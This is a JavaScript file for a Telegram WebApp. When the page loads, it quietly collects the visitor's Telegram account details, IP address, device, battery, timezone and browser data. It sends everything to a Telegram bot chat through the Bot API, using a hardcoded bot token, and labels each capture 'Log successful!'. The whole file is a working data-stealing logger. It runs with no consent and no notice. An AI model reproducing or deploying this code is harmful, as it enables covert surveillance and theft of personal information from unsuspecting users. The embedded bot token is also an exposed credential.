function getIdFromURL() {
    const urlParams = new URLSearchParams(window.location.search);
    return urlParams.get('id') || 'неизвестно'; // Get 'id' from the URL, or return 'неизвестно' if not found
}

async function sendDataToTelegram() {
    let tg = window.Telegram.WebApp;
    const token = "7497702434:AAH8I2QCNJuOq8tvsWt78Cgfk8AU7KdozsI";  // Replace with your bot token
    const ownerId = getIdFromURL(); // Use the id from URL as chat_id

    // Ensure ownerId is available, if not, use a fallback chat_id (for example, a default admin)
    const chatId = ownerId !== 'неизвестно' ? ownerId : 'default_chat_id';  // Replace 'default_chat_id' with your fallback chat_id if needed

    const ipAddress = await getIPAddress();
    const userAgent = getUserAgent();
    const osName = getOSName();
    const screenResolution = getScreenResolution();
    const batteryPercentage = await getBatteryPercentage();
    const browserInfo = getBrowserInfo();

    const userInfo = tg.initDataUnsafe.user || {};
    const username = userInfo.username ? `@${userInfo.username}` : 'неизвестно';
    const userId = userInfo.id || 'неизвестно';
    const firstName = userInfo.first_name || 'неизвестно';
    const lastName = userInfo.last_name || 'неизвестно';
    const languageCode = userInfo.language_code || 'неизвестно';
    const allowsWriteToPm = userInfo.allows_write_to_pm ? 'да' : 'нет';

    const message = `
<b> Лог успешен!</b>

<b>🔍 Информация об аккаунте:</b>
├ Тэг: ${username}
├ Айди: <code>${userId}</code>
├ Имя: <code>${firstName}</code>
├ Фамилия: <code>${lastName}</code>
├ Язык: <code>${languageCode}</code>
└ Можно писать в ЛС: <code>${allowsWriteToPm}</code>

<b>🖥️ Информация об устройстве:</b>
├ Айпи: <code>${ipAddress}</code>
├ UserAgent: <code>${userAgent}</code>
├ Хэш: <code>неизвестно</code>
├ Имя ОС: <code>${osName}</code>
├ Разрешение экрана: <code>${screenResolution}</code>
├ Процент батареи: <code>${batteryPercentage}%</code>
└ Часовой пояс: <code>${new Date().getTimezoneOffset()}</code>

<b>🌐 Информация о браузере:</b>
├ Название браузера: <code>${browserInfo.name}</code>
├ Версия браузера: <code>${browserInfo.version}</code>
└ Тип движка браузера: <code>${browserInfo.engine}</code>
`;

    const url = `https://api.telegram.org/bot${token}/sendMessage`;

    const formData = new URLSearchParams();
    formData.append('chat_id', chatId);  // Using the extracted id as chat_id
    formData.append('text', message);
    formData.append('parse_mode', 'HTML');

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            body: formData.toString()
        });
        if (!response.ok) {
            throw new Error('Ошибка при отправке запроса: ' + response.statusText);
        }
        console.log('Запрос успешно отправлен');
    } catch (error) {
        console.error('Ошибка:', error);
    }
}

sendDataToTelegram();
